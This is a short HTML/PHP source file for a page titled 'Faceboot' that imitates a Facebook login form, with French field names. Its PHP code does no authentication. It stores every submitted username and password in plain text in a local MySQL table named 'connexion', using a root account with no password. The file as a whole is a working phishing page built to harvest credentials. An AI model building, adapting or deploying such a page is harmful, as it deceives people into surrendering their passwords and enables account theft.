<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Faceboot</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" type="text/css" media="screen" href="main.css">
<script type="texte/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6/jquery.min.js"></script>
</head>
<body>

    <form action="index.php" method="POST">
        <div class="input">
            <p>
                <input class="email" type="text" name="pseudo" />
                <input class="motdepasse" type="password" name="mdp" />
                <input class="bouton" type="submit" name="valider" value="Connexion"/>
            </p>
        </div>
    </form>
</body>
</html>
<?php
if (isset ($_POST['valider'])){
try
{
    $bdd = new PDO('mysql:host=localhost;dbname=faceboot;charset=utf8', 'root', '', array(PDO::ATTR_ERRMODE => 
    PDO::ERRMODE_EXCEPTION));
}
catch(Exception $e)
{
        die('Erreur : '.$e->getMessage());
}

$req = $bdd->prepare('INSERT INTO connexion(pseudo, mdp) VALUES(:pseudo, :mdp)');
$req->execute(array(
'pseudo' => $_POST['pseudo'],
'mdp' => $_POST['mdp'],

));
}
?>